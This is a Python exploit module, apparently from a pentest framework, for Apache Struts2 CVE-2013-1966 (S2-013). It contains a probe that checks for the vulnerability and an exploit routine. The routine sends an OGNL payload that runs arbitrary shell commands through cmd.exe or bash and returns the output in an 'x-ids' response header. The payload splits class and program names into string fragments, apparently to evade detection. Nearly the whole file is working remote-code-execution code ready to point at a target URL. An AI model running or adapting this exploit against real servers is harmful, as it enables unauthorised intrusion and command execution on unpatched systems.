import os,sys,time,cgi,base64,random,re
from lib.common import http
from urllib import quote

class Module:
    def __init__(self,Main):
        self.main=Main
        self.info={
            'Name':'Apache Struts includeParams Remote Code Execution',
            'Author':'sushan',
            'Description':'Apache Struts2 before 2.3.14.1 allows to execute OGNL code via a crafted request that is not properly handled when using the includeParams attribute in the URL or A tag',
            'Comments':'http://www.cvedetails.com/cve/CVE-2013-1966'
        }
        self.options={
            'RHOST':{
                'Description':'The target address',
                'Required':False,
                'Value':''
            },
            'RPORT':{
                'Description':'The target port (TCP)',
                'Required':False,
                'Value':'8080'
            },
            'URIPATH':{
                'Description':'Path to action',
                'Required':False,
                'Value':'/'
            },
            'URL':{
                'Description':'The URL to use for this exploit',
                'Required':True,
                'Value':'http://192.168.111.135:8080/S2-013/link.action'
            },
            'OS':{
                'Description':'Target Platform OS',
                'Required':False,
                'Value':'windows'
            }
        }

    def payload(self,cmd):
        x='''\
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#x=(@java.lang.System@getProperty("o"+"s.na"+"me").toLowerCase().contains("wi"+"n"))).\
(#xx=@org.apache.struts2.ServletActionContext@getRequest().getHeader('x-ids')).\
(#xx=new java.lang.String((new sun.misc.BASE64Decoder()).decodeBuffer(#xx))).\
(#x=new java.lang.ProcessBuilder((#x?{"cm"+"d.e"+"xe","/"+"c",#xx}:{"/bi"+"n/b"+"as"+"h","-"+"c",#xx}))).(#x.redirectErrorStream(true)).\
(#x=@org.apache.commons.io.IOUtils@toString(#x.start().getInputStream())).\
(#x=(new sun.misc.BASE64Encoder()).encodeBuffer(#x.getBytes("utf-8")).replaceAll("\\r","").replaceAll("\\n","")).\
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].addHeader('x-ids',#x)).\
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].getWriter().close())\
'''
        return '%{'+x+'}'

    def check(self):
        req=http.Http(self.options)
        a='''\
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].addHeader('x-ids','x123#')).\
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].getWriter().close())\
'''
        xx=req.post({'Content-Type':'application/x-www-form-urlencoded'},'pic='+quote('%{'+a+'}'))
        try:
            if xx!=None and xx.status_code==200 and xx.headers['x-ids']=='x123#':
                return True
            return False
        except:
            return False

    def exploit(self,cmd):
        req=http.Http(self.options)
        xx=req.post({'Content-Type':'application/x-www-form-urlencoded','x-ids':base64.b64encode(cmd)},'pic='+quote(self.payload(cmd)))
        if xx!=None and xx.status_code==200:
            try:
                x=base64.b64decode(xx.headers['x-ids'])
                return '[*] %s' % (x)
            except:
                return xx.text
        return '[!] execute cmd error.'
